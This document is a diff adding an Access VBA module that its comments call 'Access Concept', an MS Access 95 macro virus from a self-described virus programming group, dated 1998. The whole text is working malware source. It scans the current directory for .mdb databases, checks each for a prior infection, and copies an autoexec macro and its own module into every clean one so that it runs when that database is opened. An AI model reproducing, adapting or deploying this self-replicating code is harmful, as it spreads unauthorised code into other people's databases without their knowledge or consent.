@@ -1,0 +1,63 @@
+   Attribute VB_Name = "mdlchecking"
+   Option Compare Database
+   Option Explicit
+
+   'This is a very simple and hamless Ms Access 95 macro virus
+   'I called it as "Access Concept" because it do nothing but just infect all the
+   'Access database in the current directiory.
+   'Remember, this is a production from Diffusion Virus Programming Group.
+   'Author : HamDan Wong      12-May-98
+
+   Public Function checking()
+   Dim vicworkspace As Workspace
+   Dim victimDb As DATABASE
+   Dim vicModules As Container
+   Dim vicDoc As Document
+   Dim counter As Integer
+   Dim victimName As String
+   Dim thisDb As String
+   Dim thisDir As String
+   Dim infected As Boolean
+
+
+   Set vicworkspace = DBEngine.Workspaces(0)
+
+   victimName = Dir("*.mdb")
+   thisDb = CurrentDb.Name
+
+   While victimName <> ""
+
+     If Len(CurDir) > 3 Then
+        victimName = CurDir & "\" & victimName
+     Else
+        victimName = CurDir & victimName
+     End If
+     If victimName <> thisDb Then
+       Set victimDb = vicworkspace.OpenDatabase(victimName)
+       Set vicModules = victimDb.Containers("Modules")
+
+       If vicModules.Documents.Count = 0 Then
+          DoCmd.CopyObject victimName, "Autoexec_", acMacro, "Autoexec_"
+          DoCmd.CopyObject victimName, "mdlchecking", acModule, "mdlchecking"
+       Else
+          infected = False
+          For counter = 0 To vicModules.Documents.Count - 1
+            Set vicDoc = vicModules.Documents(counter)
+            If vicDoc.Name = "mdlchecking" Then
+               infected = True
+               Beep
+               Exit For
+            End If
+          Next counter
+          If infected = False Then
+               DoCmd.CopyObject victimName, "Autoexec_", acMacro, "Autoexec_"
+               DoCmd.CopyObject victimName, "mdlchecking", acModule, "mdlchecking"
+          End If
+
+       End If
+
+       victimDb.Close
+     End If
+     victimName = Dir
+   Wend
+   End Function
